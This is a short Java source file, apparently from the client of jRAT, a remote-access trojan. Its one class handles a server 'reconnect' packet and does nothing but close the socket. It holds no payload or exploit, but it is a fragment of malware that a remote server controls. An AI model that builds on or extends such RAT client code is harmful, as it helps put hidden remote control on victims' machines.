package jrat.client.packets.incoming;

import jrat.client.Connection;

public class Packet45Reconnect extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.getSocket().close();
	}

}
